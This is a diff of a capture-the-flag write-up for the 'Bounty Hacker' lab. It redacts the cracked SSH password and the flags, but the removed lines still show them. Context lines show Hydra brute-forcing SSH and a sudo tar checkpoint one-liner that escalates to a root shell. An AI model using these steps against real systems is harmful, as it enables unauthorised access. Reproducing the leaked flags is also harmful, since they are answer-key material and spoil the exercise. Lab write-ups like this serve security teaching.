@@ -65,10 +65,9 @@ Question 2 - What service can you bruteforce with the text file found? - SSH
 
 The next thing was getting Hydra ready. I passed the `-l lin` for user and `-P locks.txt` for the list and .. 
 
-`[22][ssh] host: 10.10.113.185   login: lin   password: RedDr4gonSynd1cat3`
+`[22][ssh] host: 10.10.113.185   login: lin   password: ******************`
 
 Houston, we're in. \
-Question 3 - What is the users password? - RedDr4gonSynd1cat3
 
 Now that I had the SSH login credentials, I decided to look around. So, I logged in `ssh lin@10.10.113.185`. Inside, I listed the contents
 of the current directory and found the first flag.\
@@ -79,7 +78,7 @@ Question 4 - user.txt
 lin@bountyhacker:~/Desktop$ ls
 user.txt
 lin@bountyhacker:~/Desktop$ cat user.txt
-THM{CR1M3_SyNd1C4T3}
+******************
 ```
 
 So, being here I could've gone with [Linpeas](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS) but since the password was already cracked I listed the users permissions with `sudo -l`.
@@ -95,7 +94,6 @@ With this, I decided to go to [GTFOBins](https://gtfobins.github.io/) and search
 `tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash`
 
 Aaaanddd, we have root. \
-Question 5 - root.txt
 
 ```bash
 root@bountyhacker:~/Desktop# whoami
@@ -104,7 +102,7 @@ root@bountyhacker:~/Desktop# cd /root
 root@bountyhacker:/root# ls
 root.txt
 root@bountyhacker:/root# cat root.txt
-THM{80UN7Y_h4cK3r}
+******************
 ```
 
 ## License
